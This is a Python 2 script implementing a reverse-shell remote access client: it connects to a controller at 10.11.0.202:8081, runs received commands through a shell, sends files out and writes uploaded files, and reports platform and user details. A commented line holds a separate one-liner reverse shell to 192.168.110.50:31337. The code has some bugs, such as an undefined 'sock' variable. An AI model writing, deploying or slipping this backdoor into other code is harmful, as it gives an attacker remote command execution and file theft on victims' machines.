#!/usr/bin/python
#import commands
#import shutil
import socket
import subprocess
import os
import platform
import sys
import ctypes
import hashlib

def transfer(s,command):
    x1,src,dst=map(str,command.split(' '))
    if (x1=='download'):
        if os.path.exists(src):
            f = open(src, 'rb')
            packet = f.read(1024)
            while packet != '':
                s.send(packet) 
                packet = f.read(1024)
            s.send('DONE')
            f.close()
        else: # the file doesn't exist
            s.send('Unable to find out the file')
        md5_cl=hashlib.md5(open(src,'rb').read()).hexdigest()
        md5_sv=s.recv(1024)
        if md5_sv==md5_cl :
            s.send('md5 OK')
        else :
            s.send('md5 NOK')
  
    elif (x1=='upload'):
        file_to_write=open(dst,'wb')
        bits=s.recv(1024)    
        while True: 
            if not bits.endswith('DONE'):
                file_to_write.write(bits)
            elif bits.endswith('DONE'):
                bits=bits.replace('DONE','')
                file_to_write.write(bits)
                file_to_write.close()
                break
            #bits=s.recv(1024)
        #md5_cl=hashlib.md5(open(dst,'rb').read()).hexdigest()
        #md5_sv=s.recv(1024)
        #if md5_cl==md5_sv:
        #    s.send('md5 OK')
        #else :
        #    s.send('md5 NOK')


def connect():
    #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.110.50",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.11.0.202', 8081))



    while True:
        command =  s.recv(1024)

        if 'terminate' in command:
            sock.send("Connection is shutting down ..................\n\n")
            s.close()
            break

        elif 'download' in command:            
            transfer(s,command)
        elif 'upload' in command:
            transfer(s,command)

        #elif 'cd' in command:# the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
         #   code,directory = command.split(" ") # split up the received command based on space into two variables
          #  os.chdir(directory) # changing the directory
           # # we send back a string mentioning the new CWD Note, os.getcwd should stop it from hanging
            #s.send( "[+] CWD Is " + os.getcwd() )
        elif 'cd' in command:
            for x in command:
                if 'cd*' in x:
                    code, command = command.split("*")
                    os.chdir(command)
                    s.send ("[+] CWD Is " + os.getcwd())
                elif 'cd' in command:
                    code, command = command.split(" ")
                    os.chdir(command)
                    s.send ("[+] CWD Is " + os.getcwd())



        elif 'getenv' in command:
            s.send( "[+] Platform Is " + platform.platform())

        elif 'getuid' in command:
            s.send( "[+] UserID Is " + os.environ.get('USERNAME'))


        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  )
            s.send( CMD.stderr.read()  )

def main ():
    connect()
main()
